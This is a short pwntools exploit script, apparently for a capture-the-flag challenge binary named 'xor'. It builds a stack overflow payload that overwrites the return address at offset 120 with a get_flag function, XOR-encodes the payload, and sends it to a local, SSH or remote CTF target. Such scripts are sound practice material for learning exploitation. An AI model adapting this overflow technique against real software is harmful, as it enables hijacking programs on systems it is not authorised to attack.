#!/usr/bin/python3

from pwn import *

context.terminal = ['konsole','-e']
#context.log_level = 'debug'
context.binary = './build/xor'

e = ELF('./build/xor')
rop = ROP('./build/xor')
if 'd' in sys.argv:
    p = gdb.debug('./build/xor')
elif 'r' in sys.argv:
    p = remote('ctf.isss.io', 5000)
elif 's' in sys.argv:
    s = ssh(host='host', user='username', password='password')
    p = s.process('./build/xor', cwd='problemDir')
else:
    p = process('./build/xor')

#payload = bytearray(cyclic(150))
payload = bytearray(flat({120: e.sym['get_flag']}))

for i in range(len(payload)):
    payload[i] ^= 13

p.recvline()
p.recvline()
p.sendline('150')
p.recvline()
p.sendline(bytes(payload))
p.recvline()
p.recvline()
p.interactive()
